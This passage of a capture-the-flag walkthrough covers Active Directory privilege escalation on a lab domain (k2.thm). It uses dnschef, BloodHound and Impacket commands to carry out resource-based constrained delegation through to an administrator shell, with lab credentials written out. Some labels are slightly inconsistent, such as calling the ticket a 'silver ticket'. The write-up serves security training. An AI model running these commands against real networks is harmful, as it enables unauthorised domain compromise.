You can't access via `evil-winrm` nor `RDP` with `o.armstrong`  credentials.

`BloodHound-python` is a tool used to gather Active Directory data, focusing on relationships and attack paths between users, groups, and computers. It collects information such as group memberships and user privileges, which can be visualized to help identify potential privilege escalation opportunities.


## dnschef

Since you could get problems with the name server using the tool that it does not work properly, you must use `dnschef`. DNSChef is a DNS proxy tool used for DNS spoofing, allowing users to intercept and modify DNS requests. It can be used in penetration testing to redirect traffic or simulate malicious DNS responses for specific domains.

#Attaking_Machine 
```
dnschef --fakeip <MACHINE IP>
```

![[dnschef.png]]

## bloodhound-python

#Attaking_Machine 
After setting up DNSChef, we use the following call to bloodhound-python with the credentials from `r.bud` to gather Active Directory data to find an exploit path.

```
bloodhound-python -u o.armstrong -p arMStronG08 -d k2.thm -c All -dc K2RootDC.k2.thm -ns 10.65.172.253 --disable-autogc
```

![[bloodhound3.png]]

After this you'll get a few `.json` files on your directory.

![[json3.png]]

## Bloodhound

At the time of writing this walkthrough I was working on Kali Linux 2025.4.
BloodHound: v8.3.1.

> [!Note]
So as to install neo4j and bloodhoun I've done a section that does it for you automatically. [[BloodHound Community Edition (CE) Setup Guide on Kali Linux (VM)UNATTENDED BLOODHOUND INSTALLER — Kali 2025.Repo Edition]]


### Importing data

#Bloodhound
Upload all the `.json` files to Bloodhound.

### Exploring data

#Bloodhound
1. Go to Explore and search `o.armstrong`.
2. Select the node.
3. On the right side panel select `Outbound Object Control`.

![[outbound3.png]]


You can see `o.armstrong` is part of the  `IT Director`  group, which gives him a `GenericWrite` privilege over the domain controller !


![[o.armstrongtok2rootcd.k2.png]]

4. Select `GenericWrite`., you'll see a right panel with a `Linux Abuse` section.

![[linux_abuse.png|534x769]]

You can perform `Resource-Based Constrained Delegation (RBCD)`. More info [here](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd).
## Resource-Based Constrained Delegation

To do it all you must use `Impacket`.

### Add a computer

#Attaking_Machine 
Add a new computer to the domain.

```
impacket-addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip <target IP> 'k2.thm/o.armstrong:arMStronG08'
```

![[addComputer.png]]


### Modify attribute of K2ROOTDC

#Attaking_Machine 
Modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `K2ROOTDC` with our newly created machine account.

```
impacket-rbcd.py -delegate-from 'evilcomputer$' -delegate-to 'K2RootDC$' -action 'write' -dc-ip <target IP> 'k2.thm/o.armstrong:arMStronG08'
```

![[rcbd.png]]

### Silver ticket request

#Attaking_Machine 
Request a ticket for the administrator and save it to the `KRB5CCNAME` env variable:

```
impacket-getST.py -spn cifs/K2RootDC.k2.thm -impersonate administrator -dc-ip <target IP> 'k2.thm//evilcomputer$:ev1lP@sS'

export KRB5CCNAME=./administrator@cifs_K2RootDC.k2.thm@K2.THM.ccache
```

![[silver_ticket.png]]

### Request access as the administrator

#Attaking_Machine 
Get a shell as the administrator.

```
impacket-wmiexec -k -no-pass Administrator@K2RootDC.k2.thm
```

![[wimexec.png]]


> [!Success] 
> You are root.

**Next step:** [[The Summit/Root's flag|Root's flag]]

